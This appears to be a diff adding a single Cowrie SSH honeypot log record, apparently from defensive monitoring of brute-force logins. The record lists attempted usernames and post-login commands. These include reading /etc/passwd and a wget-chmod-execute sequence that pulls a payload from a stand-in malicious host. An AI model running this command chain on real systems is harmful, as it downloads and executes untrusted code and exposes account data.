@@ -1,0 +1,15 @@
+{
+  "sensor": "cowrie-ssh",
+  "timestamp": "2026-02-04T08:10:12+04:00",
+  "src_ip": "185.199.110.153",
+  "dst_port": 22,
+  "username_attempts": ["root", "admin", "test"],
+  "commands": [
+    "uname -a",
+    "cat /etc/passwd",
+    "wget http://malicious-example.com/payload.sh",
+    "chmod +x payload.sh",
+    "./payload.sh"
+  ],
+  "notes": "Bruteforce followed by post-auth commands"
+}
